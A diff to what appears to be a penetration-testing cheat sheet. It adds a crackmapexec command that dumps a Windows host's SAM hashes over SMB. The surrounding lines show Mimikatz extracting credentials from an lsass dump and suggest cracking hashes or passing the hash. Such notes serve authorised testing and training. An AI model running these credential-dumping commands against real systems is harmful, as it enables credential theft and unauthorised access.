@@ -347,7 +347,10 @@ Dump lsass, then use Mimikatz to extract hashes locally (Windows Defender should
      .\mimikatz.exe      
      mim# sekurlsa::minidmp lsass.dmp        
      mim# sekurlsa::logonPasswords full    
- 
+Using crackmapexec to dump creds from a standalone Windows box:     
+
+    crackmapexec smb 10.10.10.10 -u UserNAme -p 'PASSWORDH' --sam   #dump SAM - needs admin creds      
+
 *then crack hashes or use pass the hash to login* 
 [Online hash cracker](https://crackstation.net/) 
      
